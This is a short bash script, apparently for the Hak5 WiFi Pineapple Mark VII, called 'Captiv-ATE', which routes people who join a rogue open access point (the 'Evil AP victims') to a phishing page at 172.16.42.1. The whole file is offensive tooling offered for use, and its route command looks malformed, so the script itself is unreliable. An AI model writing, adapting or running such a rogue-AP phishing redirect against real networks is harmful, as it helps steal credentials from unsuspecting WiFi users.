#!/bin/bash

# Script meant to run on Hak5 WiFi Pineapple Mark VII
# Redirects clients/victims to the phishing page on connection to the open AP

printf "\n Captiv-ATE - The super simple script that directs WiFi Pineapple's Evil AP victims to your phishing page\n"
printf "\n This script assumes you are using default settings on your pineapple.\n"
printf "\n Edit the function to use a custom IP address!\n"

# See available wireless interfaces

iwconfig | grep -e "wlan"

echo -n "Which interface is in Master mode:"
read int


# Default Pineapple setup

default() {
route add net * netmask 255.255.255.0 gw 172.16.42.1 metric 0 $int
printf "Victims will automatically be forwarded to phishing page at 172.16.42.1\n\n"
}

default
